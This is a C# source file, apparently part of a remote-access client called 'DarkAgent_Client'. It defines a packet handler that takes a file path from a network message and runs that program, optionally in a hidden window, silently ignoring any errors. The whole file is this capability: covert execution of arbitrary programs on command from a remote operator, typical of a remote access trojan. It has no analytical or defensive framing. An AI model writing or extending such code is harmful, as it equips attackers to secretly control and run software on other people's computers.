using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;

namespace DarkAgent_Client.src.Network.DataNetwork.Packets.Receive
{
    class R_StartProcess : ReceiveBasePacket
    {
        public R_StartProcess(ClientConnect client, byte[] packet)
            : base(client, packet)
        {
        }

        private string FileLocation;
        private byte hidden;
        public override void Read()
        {
            FileLocation = ReadString();
            hidden = ReadByte();
        }

        public override void Run()
        {
            try
            {
                if (hidden == 0)
                    Process.Start(FileLocation);
                else
                {
                    Process proc = new Process();
                    proc.StartInfo.FileName = FileLocation;
                    proc.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                    proc.Start();
                }
            }
            catch
            {
            	
            }
        }
    }
}
